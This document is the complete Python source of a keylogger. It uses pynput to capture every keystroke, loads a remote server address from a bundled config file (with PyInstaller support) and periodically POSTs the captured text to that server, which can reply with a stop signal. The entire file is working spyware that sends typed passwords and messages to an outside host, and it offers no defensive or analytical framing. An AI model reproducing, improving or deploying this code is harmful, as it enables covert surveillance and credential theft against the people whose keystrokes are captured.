# Install pynput using the following command: pip install pynput
from pynput import keyboard
import requests
import json
import threading
import logging
import os
import signal
import sys

# Configure logging
logging.basicConfig(
    filename="keylogger.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Locate the configuration file
try:
    # Determine the base path (handles PyInstaller's temp directory)
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    config_path = os.path.join(base_path, "config.json")
    
    # Load the configuration
    with open(config_path, "r") as config_file:
        config = json.load(config_file)
    ip_address = config["ip_address"]  # Correctly read IP address
    port_number = config["port_number"]  # Correctly read port number
    time_interval = config["time_interval"]  # Correctly read time interval
except (FileNotFoundError, KeyError, json.JSONDecodeError) as e:
    logging.error(f"Error loading configuration: {e}")
    exit(1)

# Global variables
text = ""
text_lock = threading.Lock()
stop_event = threading.Event()

def send_post_req():
    """Send the collected keystrokes to the server."""
    global text
    try:
        with text_lock:
            if not text.strip():  # Skip sending if no data is collected
                logging.info("No data to send.")
                return
            payload = json.dumps({"keyboardData": text})
            text = ""  # Clear text after sending
        response = requests.post(
            f"http://{ip_address}:{port_number}/",  # Updated endpoint
            data=payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        response.raise_for_status()  # Raise exception for HTTP errors
        logging.info("Data sent successfully.")

        # Check if the response is valid JSON
        try:
            response_json = response.json()
            if response_json.get("stop", False):
                logging.info("Stop signal received from server.")
                stop_event.set()
        except json.JSONDecodeError:
            logging.error("Invalid JSON response from server.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")
    finally:
        if not stop_event.is_set():
            # Schedule the next execution if stop signal is not set
            timer = threading.Timer(time_interval, send_post_req)
            timer.start()

def stop_keylogger():
    """Gracefully stop the keylogger."""
    logging.info("Stopping keylogger...")
    stop_event.set()

def on_press(key):
    """Handle key press events."""
    global text
    try:
        with text_lock:
            if key == keyboard.Key.enter:
                text += "\n"
            elif key == keyboard.Key.tab:
                text += "\t"
            elif key == keyboard.Key.space:
                text += " "
            elif key == keyboard.Key.backspace and len(text) > 0:
                text = text[:-1]
            elif key == keyboard.Key.esc:
                stop_keylogger()
                return False  # Stop the listener
            elif hasattr(key, 'char') and key.char:  # Check if the key has a character representation
                text += key.char  # Append the character as-is
            else:
                text += f"[{key.name}]"  # Handle special keys like Ctrl, Alt, etc.
    except Exception as e:
        logging.error(f"Error processing key press: {e}")

if __name__ == "__main__":
    # Automatically start capturing keystrokes
    logging.info("Keylogger started.")
    try:
        # Start the keyboard listener
        with keyboard.Listener(on_press=on_press) as listener:
            # Start sending data to the server
            send_post_req()
            listener.join()  # Keep the listener running
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
    finally:
        logging.info("Keylogger terminated.")
